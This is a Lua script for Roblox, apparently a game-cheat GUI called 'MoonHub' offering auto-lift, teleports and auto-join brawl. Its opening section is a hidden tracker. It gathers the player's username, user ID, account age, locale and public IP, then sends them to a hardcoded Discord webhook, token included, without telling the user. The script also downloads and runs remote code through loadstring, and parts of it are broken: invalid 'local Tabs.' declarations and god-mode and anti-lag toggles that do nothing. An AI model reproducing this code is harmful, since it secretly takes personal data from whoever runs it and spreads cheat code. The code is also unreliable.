local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")


local player = Players.LocalPlayer
local leaderstats = player:FindFirstChild("leaderstats")


local function getExecutor()
    if syn then return "Synapse X" end
    if is_sirhurt_closure then return "SirHurt" end
    if pebc_execute then return "ProtoSmasher" end
    if KRNL_LOADED then return "Krnl" end
    if secure_load then return "Sentinel" end
    if identifyexecutor and identifyexecutor():find("ScriptWare") then return "Script-Ware" end
    return "Unsupported"
end


local function getIP()
    local success, ip = pcall(function()
        return game:HttpGet("https://v4.ident.me/")
    end)
    return success and ip or "IP non disponible"
end


local function formatNumber(num)
    local suffixes = {"", "K", "M", "B", "T", "QA", "QI"}
    local i = 1
    while num >= 1000 and i < #suffixes do
        num = num / 1000
        i = i + 1
    end
    return string.format("%.1f%s", num, suffixes[i])
end


local displayName = player.DisplayName
local username = player.Name
local userId = player.UserId
local membership = tostring(player.MembershipType)
local accountAge = player.AccountAge
local country = LocalizationService.RobloxLocaleId
local ip = getIP()


local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local joinCommand = string.format("Roblox.GameLauncher.joinGameInstance(%d, \"%s\")", gameId, jobId)


local strength = leaderstats and leaderstats:FindFirstChild("Strength") and formatNumber(leaderstats.Strength.Value) or "N/A"
local kills = leaderstats and leaderstats:FindFirstChild("Kills") and formatNumber(leaderstats.Kills.Value) or "N/A"
local durability = leaderstats and leaderstats:FindFirstChild("Durability") and formatNumber(leaderstats.Durability.Value) or "N/A"


local payload = {
    username = "Execution Tracker",
    avatar_url = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
    embeds = {
        {
            title = "🚀 Script Executed",
            description = "**Execution Details**",
            color = tonumber("0x00FF00"),
            fields = {
                {
                    name = "👤 **Player Info**",
                    value = string.format(
                        "- Display Name: `%s`\n- Username: `%s`\n- UserId: `%d`\n- Membership: `%s`\n- Account Age: `%d days`\n- Country: `%s`\n- IP: `%s`",
                        displayName, username, userId, membership, accountAge, country, ip
                    ),
                    inline = true
                },
                {
                    name = "🎮 **Game Info**",
                    value = string.format(
                        "- Game Name: `%s`\n- Game ID: `%d`\n- Job ID: `%s`\n- Join Command: `%s`",
                        gameName, gameId, jobId, joinCommand
                    ),
                    inline = true
                },
                {
                    name = "📊 **Player Stats**",
                    value = string.format(
                        "- Strength: `%s`\n- Kills: `%s`\n- Durability: `%s`",
                        strength, kills, durability
                    ),
                    inline = true
                }
            }
        }
    }
}


local webhookUrl = "https://canary.discord.com/api/webhooks/1323579899214303272/fDEQ9eNPCVOdv5gTiw66S-bD0zsKay2Cr-GAS2OJVaVtk79YTRXGDxeJBOVKuPElRsBt"
HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(payload))


print("Executor: " .. getExecutor())

-- Fluent GUI Setup
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local Window = Fluent:CreateWindow({
    Title = "MoonHub " .. Fluent.Version,
    SubTitle = "by Moonlight×Godlike",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

-- Tabs Setup
local Tabs = {}
Tabs.Main = Window:AddTab({
    Title = "Main",
    Icon = "Anchor"
})

-- Destroy Ad Portal Toggle
Tabs.Main:AddToggle("DestroyAdPortal", {
    Title = "Destroy AD portal",
    Description = "This destroys the annoying ad portal",
    Default = false,
    Callback = function(state)
        if state then
            print("Ad portal toggle ON")
            local part = workspace:FindFirstChild("RobloxForwardPortals")
            if part then
                part:Destroy()
                print("Ad portal destroyed.")
            else
                print("No ad portal found.")
            end
        else
            print("Ad portal toggle OFF")
        end
    end
})

-- Anti AFK Toggle
Tabs.Main:AddToggle("AntiAFK", {
    Title = "Anti AFK",
    Description = "Prevents the game from kicking you for being idle",
    Default = false,
    Callback = function(state)
        if state then
            print("Anti AFK ON")
            loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
        else
            print("Anti AFK OFF")
        end
    end
})

-- Anti Lag Toggle
local isAntiLagEnabled = false
local function setAntiLag(value)
    isAntiLagEnabled = value
    if isAntiLagEnabled then
        print("Anti-Lag Enabled")
        -- Add the functionality for Anti-Lag here
        -- Example: Lowering graphics or disabling some features
    else
        print("Anti-Lag Disabled")
        -- Revert Anti-Lag functionality here
    end
end

Tabs.Main:AddToggle("AntiLag", {
    Title = "Anti Lag",
    Description = "This prevents your game from lagging.",
    Default = false,
    Callback = function(state)
        setAntiLag(state)
    end
})

-- Auto Join Brawl Toggle
local autoJoinToggle = false
Tabs.Main:AddToggle("AutoJoinBrawl", {
    Title = "Auto Join Brawl",
    Description = "Automatically join brawl events.",
    Default = false,
    Callback = function(state)
        autoJoinToggle = state
        if autoJoinToggle then
            task.spawn(function()
                while autoJoinToggle do
                    game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                    task.wait(2)
                end
            end)
        end
    end
})

-- Other Tabs
local Tabs.AutoWeight = Window:AddTab({
    Title = "Auto Weight",
    Icon = "Muscle"
})

Tabs.AutoWeight:AddToggle("Auto Lift", {
    Title = "Auto Lift",
    Description = "Automatically perform lifting action.",
    Default = false,
    Callback = function(state)
        local autoRepToggle = state
        if autoRepToggle then
            task.spawn(function()
                while autoRepToggle do
                    game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
                    task.wait(0.1)
                end
            end)
        end
    end
})

local Tabs.TPGyms = Window:AddTab({
    Title = "TP Gyms",
    Icon = "Clock"
})

local TeleportLocations = {
    ["Muscle King Gym"] = Vector3.new(-8936, 17, -5926),
    ["Legends Gym"] = Vector3.new(4342, 1001, -3758),
    ["Infernal Gym"] = Vector3.new(-6946, 17, -1204),
    ["Mythical Gym"] = Vector3.new(2379, 17, 1065),
    ["Frost Gym"] = Vector3.new(-2719, 17, -397),
    ["Tiny Island"] = Vector3.new(-24, 18, 1940),
    ["Spawn Island"] = Vector3.new(-20.81, 7.30, -108.03)
}

for gymName, position in pairs(TeleportLocations) do
    Tabs.TPGyms:AddButton({
        Name = gymName,
        Callback = function()
            local player = Players.LocalPlayer
            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(position)
            end
        end
    })
end

-- Add Credits Section
local CreditsTab = Window:AddTab({
    Title = "Credits",
    Icon = "Heart"
})

local Section = CreditsTab:AddSection("Co-developers: xeno\nTesters: H3LL_TheSouthGoat\nTrusted friends: Xeno, TheSouthGoat, Billy")
Section:AddLabel("Moonlight×Godlike")
Section:AddLabel("Other Co-developers")

-- God Mode Brawl Toggle
Tabs.Main:AddToggle("GodModeBrawl", {
    Title = "GOD MODE [BRAWL]",
    Description = "INVINCIBLE",
    Default = false,
    Callback = function(state)
        if state then
            print("God Mode Brawl ON")
        else
            print("God Mode Brawl OFF")
        end
    end
})

-- God Mode (Brawl) Auto Join Toggle
Tabs.Main:AddToggle("AutoJoinGodModeBrawl", {
    Title = "Auto Join God Mode Brawl",
    Description = "Automatically join brawl events with God Mode.",
    Default = false,
    Callback = function(state)
        local godModeToggle = state
        if godModeToggle then
            task.spawn(function()
                while godModeToggle do
                    game:GetService("ReplicatedStorage").rEvents.brawlEvent:FireServer("joinBrawl")
                    task.wait(0)
                end
            end)
        end
    end
})
